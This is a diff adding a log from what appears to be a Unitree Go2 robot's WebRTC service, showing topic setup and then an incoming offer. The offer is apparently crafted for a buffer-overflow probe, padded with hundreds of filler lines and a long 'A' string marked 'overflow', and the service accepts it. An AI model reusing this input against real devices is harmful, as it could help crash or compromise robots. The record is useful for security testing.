@@ -1,0 +1,989 @@
+[2024-05-17 11:35:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/unitreeWebRTCClientMaster.c:431]: unitreeWebRTCMaster init, asign core to 2, not set priority
+[2024-05-17 11:35:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/signaling.h:391]: registerWebrtcConnectionWriter() topicName=rt/webrtcres, dds create writer successful.
+[2024-05-17 11:35:26 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/signaling.h:412]: registerWebrtcConnectionWriter() topicName=rt/xfk_webrtcres, dds create writer successful.
+[2024-05-17 11:35:26 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/signaling.h:73]: registerWebrtcConnectionListener() topicName=rt/webrtcreq, dds create reader successful.
+[2024-05-17 11:35:26 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/signaling.h:200]: registerXfkWebrtcConnectionListener() topicName=rt/xfk_webrtcreq, dds create reader successful.
+[2024-05-17 11:35:26 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/publisher.h:62]: registerPublisher() topicName=rt/uwbswitch, dds create writer successful.
+[2024-05-17 11:35:26 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/publisher.h:62]: registerPublisher() topicName=rt/servicestateactivate, dds create writer successful.
+[2024-05-17 11:35:26 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/publisher.h:62]: registerPublisher() topicName=rt/wirelesscontroller, dds create writer successful.
+[2024-05-17 11:35:26 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/publisher.h:62]: registerPublisher() topicName=rt/wirelesscontroller_unprocessed, dds create writer successful.
+[2024-05-17 11:35:26 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/publisher.h:62]: registerPublisher() topicName=rt/utlidar/switch, dds create writer successful.
+[2024-05-17 11:35:26 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/publisher.h:62]: registerPublisher() topicName=rt/rtc_status, dds create writer successful.
+[2024-05-17 11:35:26 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/publisher.h:62]: registerPublisher() topicName=rt/videohub/inner, dds create writer successful.
+[2024-05-17 11:35:26 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/publisher.h:62]: registerPublisher() topicName=rt/rtc/state, dds create writer successful.
+[2024-05-17 11:35:26 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/publisher.h:62]: registerPublisher() topicName=rt/api/rm_con/request, dds create writer successful.
+[2024-05-17 11:35:26 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/publisher.h:62]: registerPublisher() topicName=rt/api/videohub/request, dds create writer successful.
+[2024-05-17 11:35:26 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/publisher.h:62]: registerPublisher() topicName=rt/api/uwbswitch/request, dds create writer successful.
+[2024-05-17 11:35:26 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/publisher.h:62]: registerPublisher() topicName=rt/api/bashrunner/request, dds create writer successful.
+[2024-05-17 11:35:26 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/publisher.h:62]: registerPublisher() topicName=rt/api/obstacles_avoid/request, dds create writer successful.
+[2024-05-17 11:35:26 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/publisher.h:62]: registerPublisher() topicName=rt/api/vui/request, dds create writer successful.
+[2024-05-17 11:35:26 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/publisher.h:62]: registerPublisher() topicName=rt/api/gpt/request, dds create writer successful.
+[2024-05-17 11:35:26 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/publisher.h:62]: registerPublisher() topicName=rt/api/sport/request, dds create writer successful.
+[2024-05-17 11:35:26 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/publisher.h:62]: registerPublisher() topicName=rt/api/robot_state/request, dds create writer successful.
+[2024-05-17 11:35:26 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/publisher.h:62]: registerPublisher() topicName=rt/api/audiohub/request, dds create writer successful.
+[2024-05-17 11:35:26 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/publisher.h:62]: registerPublisher() topicName=rt/api/config/request, dds create writer successful.
+[2024-05-17 11:35:26 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/publisher.h:62]: registerPublisher() topicName=rt/api/motion_switcher/request, dds create writer successful.
+[2024-05-17 11:35:26 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/publisher.h:62]: registerPublisher() topicName=rt/api/gas_sensor/request, dds create writer successful.
+[2024-05-17 11:35:26 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/publisher.h:62]: registerPublisher() topicName=rt/api/fourg_agent/request, dds create writer successful.
+[2024-05-17 11:35:26 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/publisher.h:62]: registerPublisher() topicName=rt/api/programming_actuator/request, dds create writer successful.
+[2024-05-17 11:35:26 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/publisher.h:62]: registerPublisher() topicName=rt/api/assistant_recorder/request, dds create writer successful.
+[2024-05-17 11:35:26 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/publisher.h:62]: registerPublisher() topicName=rt/api/pet/request, dds create writer successful.
+[2024-05-17 11:35:26 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/publisher.h:62]: registerPublisher() topicName=rt/qt_command, dds create writer successful.
+[2024-05-17 11:35:26 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/publisher.h:62]: registerPublisher() topicName=rt/qt_add_node, dds create writer successful.
+[2024-05-17 11:35:26 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/publisher.h:62]: registerPublisher() topicName=rt/qt_add_edge, dds create writer successful.
+[2024-05-17 11:35:26 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/publisher.h:62]: registerPublisher() topicName=rt/arm_Command, dds create writer successful.
+[2024-05-17 11:35:26 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/publisher.h:62]: registerPublisher() topicName=rt/uslam/client_command, dds create writer successful.
+[2024-05-17 11:35:26 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/publisher.h:62]: registerPublisher() topicName=rt/programming_actuator/command, dds create writer successful.
+[2024-05-17 11:35:26 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/subscriber.h:76]: registerSubscriber() topicName=rt/selftest, dds create reader successful.
+[2024-05-17 11:35:26 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/subscriber.h:76]: registerSubscriber() topicName=rt/gptflowfeedback, dds create reader successful.
+[2024-05-17 11:35:26 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/subscriber.h:76]: registerSubscriber() topicName=rt/servicestate, dds create reader successful.
+[2024-05-17 11:35:26 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/subscriber.h:76]: registerSubscriber() topicName=rt/lf/battery_alarm, dds create reader successful.
+[2024-05-17 11:35:26 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/subscriber.h:76]: registerSubscriber() topicName=rt/lf/lowstate, dds create reader successful.
+[2024-05-17 11:35:26 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/subscriber.h:76]: registerSubscriber() topicName=rt/lf/sportmodestate, dds create reader successful.
+[2024-05-17 11:35:26 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/subscriber.h:76]: registerSubscriber() topicName=rt/utlidar/voxel_map_compressed, dds create reader successful.
+[2024-05-17 11:35:26 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/subscriber.h:76]: registerSubscriber() topicName=rt/utlidar/robot_pose, dds create reader successful.
+[2024-05-17 11:35:27 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/subscriber.h:76]: registerSubscriber() topicName=rt/utlidar/lidar_state, dds create reader successful.
+[2024-05-17 11:35:27 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/subscriber.h:76]: registerSubscriber() topicName=rt/uwbstate, dds create reader successful.
+[2024-05-17 11:35:27 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/subscriber.h:76]: registerSubscriber() topicName=rt/multiplestate, dds create reader successful.
+[2024-05-17 11:35:27 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/subscriber.h:76]: registerSubscriber() topicName=rt/audiohub/player/state, dds create reader successful.
+[2024-05-17 11:35:27 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/subscriber.h:76]: registerSubscriber() topicName=rt/public_network_status, dds create reader successful.
+[2024-05-17 11:35:27 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/subscriber.h:76]: registerSubscriber() topicName=rt/pet/flowfeedback, dds create reader successful.
+[2024-05-17 11:35:27 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/subscriber.h:76]: registerSubscriber() topicName=rt/api/videohub/response, dds create reader successful.
+[2024-05-17 11:35:27 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/subscriber.h:76]: registerSubscriber() topicName=rt/api/uwbswitch/response, dds create reader successful.
+[2024-05-17 11:35:27 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/subscriber.h:76]: registerSubscriber() topicName=rt/api/bashrunner/response, dds create reader successful.
+[2024-05-17 11:35:27 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/subscriber.h:76]: registerSubscriber() topicName=rt/api/obstacles_avoid/response, dds create reader successful.
+[2024-05-17 11:35:27 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/subscriber.h:76]: registerSubscriber() topicName=rt/api/vui/response, dds create reader successful.
+[2024-05-17 11:35:27 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/subscriber.h:76]: registerSubscriber() topicName=rt/api/gpt/response, dds create reader successful.
+[2024-05-17 11:35:27 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/subscriber.h:76]: registerSubscriber() topicName=rt/api/sport/response, dds create reader successful.
+[2024-05-17 11:35:27 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/subscriber.h:76]: registerSubscriber() topicName=rt/api/robot_state/response, dds create reader successful.
+[2024-05-17 11:35:27 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/subscriber.h:76]: registerSubscriber() topicName=rt/api/audiohub/response, dds create reader successful.
+[2024-05-17 11:35:27 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/subscriber.h:76]: registerSubscriber() topicName=rt/api/config/response, dds create reader successful.
+[2024-05-17 11:35:27 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/subscriber.h:76]: registerSubscriber() topicName=rt/api/motion_switcher/response, dds create reader successful.
+[2024-05-17 11:35:27 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/subscriber.h:76]: registerSubscriber() topicName=rt/api/gas_sensor/response, dds create reader successful.
+[2024-05-17 11:35:27 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/subscriber.h:76]: registerSubscriber() topicName=rt/api/fourg_agent/response, dds create reader successful.
+[2024-05-17 11:35:27 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/subscriber.h:76]: registerSubscriber() topicName=rt/api/programming_actuator/response, dds create reader successful.
+[2024-05-17 11:35:27 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/subscriber.h:76]: registerSubscriber() topicName=rt/api/assistant_recorder/response, dds create reader successful.
+[2024-05-17 11:35:27 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/subscriber.h:76]: registerSubscriber() topicName=rt/api/pet/response, dds create reader successful.
+[2024-05-17 11:35:27 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/subscriber.h:76]: registerSubscriber() topicName=rt/query_result_node, dds create reader successful.
+[2024-05-17 11:35:27 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/subscriber.h:76]: registerSubscriber() topicName=rt/query_result_edge, dds create reader successful.
+[2024-05-17 11:35:27 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/subscriber.h:76]: registerSubscriber() topicName=rt/qt_notice, dds create reader successful.
+[2024-05-17 11:35:27 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/subscriber.h:76]: registerSubscriber() topicName=rt/pctoimage_local, dds create reader successful.
+[2024-05-17 11:35:27 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/subscriber.h:76]: registerSubscriber() topicName=rt/lio_sam_ros2/mapping/odometry, dds create reader successful.
+[2024-05-17 11:35:27 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/subscriber.h:76]: registerSubscriber() topicName=rt/arm_Feedback, dds create reader successful.
+[2024-05-17 11:35:27 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/subscriber.h:76]: registerSubscriber() topicName=rt/gas_sensor, dds create reader successful.
+[2024-05-17 11:35:27 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/subscriber.h:76]: registerSubscriber() topicName=rt/uslam/frontend/cloud_world_ds, dds create reader successful.
+[2024-05-17 11:35:27 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/subscriber.h:76]: registerSubscriber() topicName=rt/uslam/frontend/odom, dds create reader successful.
+[2024-05-17 11:35:27 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/subscriber.h:76]: registerSubscriber() topicName=rt/uslam/server_log, dds create reader successful.
+[2024-05-17 11:35:27 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/subscriber.h:76]: registerSubscriber() topicName=rt/uslam/localization/odom, dds create reader successful.
+[2024-05-17 11:35:27 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/subscriber.h:76]: registerSubscriber() topicName=rt/uslam/navigation/global_path, dds create reader successful.
+[2024-05-17 11:35:27 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/subscriber.h:76]: registerSubscriber() topicName=rt/uslam/localization/cloud_world, dds create reader successful.
+[2024-05-17 11:35:27 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/subscriber.h:76]: registerSubscriber() topicName=rt/programming_actuator/feedback, dds create reader successful.
+[2024-05-17 11:35:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 11:36:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 11:36:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 11:36:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 11:37:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 11:37:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 11:37:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 11:38:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 11:38:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 11:38:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 11:39:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 11:39:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 11:39:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 11:39:49 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/signaling.h:15]: do_webrtc_req_take() trigger
+[2024-05-17 11:39:49 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1768]: offerReceived() receive offer, offer_len is 5234
+[2024-05-17 11:39:49 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1769]: offerReceived() receive offer, offer_content is {"sdp":"v=0\r\no=- 3456789012 1 IN IP4 0.0.0.0\r\ns=-\r\nt=0 0\r\na=fingerprint:sha-256 4A:AD:B9:B1:3C:82:CB:D4:8D:4F:40:58:5C:C8:49:71:19:F4:B6:B1:34:71:22:B5:36:9B:8F:D2:3E:AA:33:53\r\na=group:BUNDLE 0 1 2 3 4\r\nm=fingerprint\r\ni=sha-256 0A:D1:7E:62:D8:5B:7F:4B:BA:D4:39:51:8D:6E:BE:E0:3A:EF:93:49:E8:38:9D:BE:C9:14:DF:6F:0B:E0:AE:98\r\nc=IN IP4 0.0.0.0\r\na=ice-ufrag:Fkoq\r\na=ice-pwd:wPSqwBgv6K1OpwoPdhvFaI\r\na=setup:actpass\r\na=mid:0\r\nm=video 9 UDP/TLS/RTP/SAVPF 96\r\na=ice-ufrag:Fkoq\r\na=ice-pwd:wPSqwBgv6K1OpwoPdhvFaI\r\na=mid:1\r\nm=video 9 UDP/TLS/RTP/SAVPF 96\r\na=ice-ufrag:Fkoq\r\na=ice-pwd:wPSqwBgv6K1OpwoPdhvFaI\r\na=mid:2\r\nm=video 9 UDP/TLS/RTP/SAVPF 96\r\na=ice-ufrag:Fkoq\r\na=ice-pwd:wPSqwBgv6K1OpwoPdhvFaI\r\na=mid:3\r\nm=application 9 UDP/DTLS/SCTP webrtc-datachannel\r\na=ice-ufrag:Fkoq\r\na=ice-pwd:wPSqwBgv6K1OpwoPdhvFaI\r\na=mid:4\r\na=candidate:b06876595f855fe0ce5212e1b302209c 1 udp 2130706431 192.168.1.233 58330 typ host\r\r\na=candidate:f5a9be8b49d027a84cd23cab8db3a9af 1 udp 2130706431 100.64.113.47 61996 typ host\r\r\na=candidate:edeb15bd8d3f0dbec18897b0ffdb6515 1 udp 2130706431 192.168.123.100 65234 typ host\r\r\na=pad000:x\r\na=pad001:x\r\na=pad002:x\r\na=pad003:x\r\na=pad004:x\r\na=pad005:x\r\na=pad006:x\r\na=pad007:x\r\na=pad008:x\r\na=pad009:x\r\na=pad010:x\r\na=pad011:x\r\na=pad012:x\r\na=pad013:x\r\na=pad014:x\r\na=pad015:x\r\na=pad016:x\r\na=pad017:x\r\na=pad018:x\r\na=pad019:x\r\na=pad020:x\r\na=pad021:x\r\na=pad022:x\r\na=pad023:x\r\na=pad024:x\r\na=pad025:x\r\na=pad026:x\r\na=pad027:x\r\na=pad028:x\r\na=pad029:x\r\na=pad030:x\r\na=pad031:x\r\na=pad032:x\r\na=pad033:x\r\na=pad034:x\r\na=pad035:x\r\na=pad036:x\r\na=pad037:x\r\na=pad038:x\r\na=pad039:x\r\na=pad040:x\r\na=pad041:x\r\na=pad042:x\r\na=pad043:x\r\na=pad044:x\r\na=pad045:x\r\na=pad046:x\r\na=pad047:x\r\na=pad048:x\r\na=pad049:x\r\na=pad050:x\r\na=pad051:x\r\na=pad052:x\r\na=pad053:x\r\na=pad054:x\r\na=pad055:x\r\na=pad056:x\r\na=pad057:x\r\na=pad058:x\r\na=pad059:x\r\na=pad060:x\r\na=pad061:x\r\na=pad062:x\r\na=pad063:x\r\na=pad064:x\r\na=pad065:x\r\na=pad066:x\r\na=pad067:x\r\na=pad068:x\r\na=pad069:x\r\na=pad070:x\r\na=pad071:x\r\na=pad072:x\r\na=pad073:x\r\na=pad074:x\r\na=pad075:x\r\na=pad076:x\r\na=pad077:x\r\na=pad078:x\r\na=pad079:x\r\na=pad080:x\r\na=pad081:x\r\na=pad082:x\r\na=pad083:x\r\na=pad084:x\r\na=pad085:x\r\na=pad086:x\r\na=pad087:x\r\na=pad088:x\r\na=pad089:x\r\na=pad090:x\r\na=pad091:x\r\na=pad092:x\r\na=pad093:x\r\na=pad094:x\r\na=pad095:x\r\na=pad096:x\r\na=pad097:x\r\na=pad098:x\r\na=pad099:x\r\na=pad100:x\r\na=pad101:x\r\na=pad102:x\r\na=pad103:x\r\na=pad104:x\r\na=pad105:x\r\na=pad106:x\r\na=pad107:x\r\na=pad108:x\r\na=pad109:x\r\na=pad110:x\r\na=pad111:x\r\na=pad112:x\r\na=pad113:x\r\na=pad114:x\r\na=pad115:x\r\na=pad116:x\r\na=pad117:x\r\na=pad118:x\r\na=pad119:x\r\na=pad120:x\r\na=pad121:x\r\na=pad122:x\r\na=pad123:x\r\na=pad124:x\r\na=pad125:x\r\na=pad126:x\r\na=pad127:x\r\na=pad128:x\r\na=pad129:x\r\na=pad130:x\r\na=pad131:x\r\na=pad132:x\r\na=pad133:x\r\na=pad134:x\r\na=pad135:x\r\na=pad136:x\r\na=pad137:x\r\na=pad138:x\r\na=pad139:x\r\na=pad140:x\r\na=pad141:x\r\na=pad142:x\r\na=pad143:x\r\na=pad144:x\r\na=pad145:x\r\na=pad146:x\r\na=pad147:x\r\na=pad148:x\r\na=pad149:x\r\na=pad150:x\r\na=pad151:x\r\na=pad152:x\r\na=pad153:x\r\na=pad154:x\r\na=pad155:x\r\na=pad156:x\r\na=pad157:x\r\na=pad158:x\r\na=pad159:x\r\na=pad160:x\r\na=pad161:x\r\na=pad162:x\r\na=pad163:x\r\na=pad164:x\r\na=pad165:x\r\na=pad166:x\r\na=pad167:x\r\na=pad168:x\r\na=pad169:x\r\na=pad170:x\r\na=pad171:x\r\na=pad172:x\r\na=pad173:x\r\na=pad174:x\r\na=pad175:x\r\na=pad176:x\r\na=pad177:x\r\na=pad178:x\r\na=pad179:x\r\na=pad180:x\r\na=pad181:x\r\na=pad182:x\r\na=pad183:x\r\na=pad184:x\r\na=pad185:x\r\na=pad186:x\r\na=pad187:x\r\na=pad188:x\r\na=pad189:x\r\na=pad190:x\r\na=pad191:x\r\na=pad192:x\r\na=pad193:x\r\na=pad194:x\r\na=pad195:x\r\na=pad196:x\r\na=pad197:x\r\na=pad198:x\r\na=pad199:x\r\na=pad200:x\r\na=pad201:x\r\na=pad202:x\r\na=pad203:x\r\na=pad204:x\r\na=pad205:x\r\na=pad206:x\r\na=pad207:x\r\na=pad208:x\r\na=pad209:x\r\na=pad210:x\r\na=pad211:x\r\na=pad212:x\r\na=pad213:x\r\na=pad214:x\r\na=pad215:x\r\na=pad216:x\r\na=pad217:x\r\na=pad218:x\r\na=pad219:x\r\na=pad220:x\r\na=pad221:x\r\na=pad222:x\r\na=pad223:x\r\na=pad224:x\r\na=pad225:x\r\na=pad226:x\r\na=pad227:x\r\na=pad228:x\r\na=pad229:x\r\na=pad230:x\r\na=pad231:x\r\na=pad232:x\r\na=pad233:x\r\na=pad234:x\r\na=pad235:x\r\na=pad236:x\r\na=pad237:x\r\na=pad238:x\r\na=pad239:x\r\na=pad240:x\r\na=pad241:x\r\na=pad242:x\r\na=pad243:x\r\na=pad244:x\r\na=pad245:x\r\na=pad246:x\r\na=pad247:x\r\na=pad248:x\r\na=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA:overflow\r\n","id":"STA_localNetwork","type":"offer","token":""}
+[2024-05-17 11:39:49 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:341]: hasConnectedSession() trigger
+[2024-05-17 11:39:49 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1636]: isOfferContainTurnServer() offer not contain turnserver 
+
+[2024-05-17 11:39:49 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1792]: offerReceived() offer not contain turnserver info!
+[2024-05-17 11:39:49 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1795]: offerReceived() offer check passed!
+[2024-05-17 11:39:49 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1808]: offerReceived() length: 5234
+[2024-05-17 11:39:49 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1831]: offerReceived() check point 1
+[2024-05-17 11:39:49 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1838]: offerReceived() check point 2
+[2024-05-17 11:39:49 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1850]: offerReceived() before getTurnServerInfo!
+[2024-05-17 11:39:49 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1852]: offerReceived() after getTurnServerInfo!
+[2024-05-17 11:39:49 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:604]: createStreamingSession() enter
+[2024-05-17 11:39:49 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:646]: createStreamingSession() CP 1
+[2024-05-17 11:39:49 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:476]: initializePeerConnection() enter
+[2024-05-17 11:39:49 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:477]: initializePeerConnection() CP 1
+[2024-05-17 11:39:49 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:544]: initializePeerConnection() CP 2
+[2024-05-17 11:39:49 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:558]: initializePeerConnection() CP 3
+[2024-05-17 11:39:49 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:563]: initializePeerConnection() exit
+[2024-05-17 11:39:49 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:654]: createStreamingSession() CP 2
+[2024-05-17 11:39:49 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:668]: createStreamingSession() CP 3
+[2024-05-17 11:39:49 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:682]: createStreamingSession() CP 4
+[2024-05-17 11:39:49 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:710]: createStreamingSession() exit
+[2024-05-17 11:39:49 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1855]: offerReceived() after createStreamingSession
+[2024-05-17 11:39:49 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1858]: offerReceived() after getSignalSourceType
+[2024-05-17 11:39:49 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1863]: offerReceived() after determineSessionNetworkMode
+[2024-05-17 11:39:49 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1746]: getOfferToken() before cJSON_GetObjectItem token
+[2024-05-17 11:39:49 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1752]: getOfferToken() after cJSON_GetObjectItem token
+[2024-05-17 11:39:49 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1867]: offerReceived() after parse offer token
+[2024-05-17 11:39:50 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1911]: offerReceived() exit
+[2024-05-17 11:39:50 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:63]: connection state change to [RTC_PEER_CONNECTION_STATE_CONNECTING]
+[2024-05-17 11:39:50 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:98]: [ICE] ICE checking (连通性检查)中, peer: client1715917189
+[2024-05-17 11:39:50 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:437]: onIceCandidateHandler() enter
+[2024-05-17 11:39:50 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:446]: [ICE] Gathering candidate: {"candidate":"candidate:1 1 udp 2130706431 169.254.107.33 38985 typ host raddr 0.0.0.0 rport 0 generation 0 network-cost 999","sdpMid":"0","sdpMLineIndex":0}
+[2024-05-17 11:39:50 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:437]: onIceCandidateHandler() enter
+[2024-05-17 11:39:50 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:446]: [ICE] Gathering candidate: {"candidate":"candidate:0 1 udp 2130706431 192.168.123.161 38526 typ host raddr 0.0.0.0 rport 0 generation 0 network-cost 999","sdpMid":"0","sdpMLineIndex":0}
+[2024-05-17 11:39:50 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:437]: onIceCandidateHandler() enter
+[2024-05-17 11:39:50 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:458]: [ICE] Candidate gathering finished for peer: client1715917189
+[2024-05-17 11:39:50 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/signaling.h:211]: webrtcConnectionAnswer() trigger
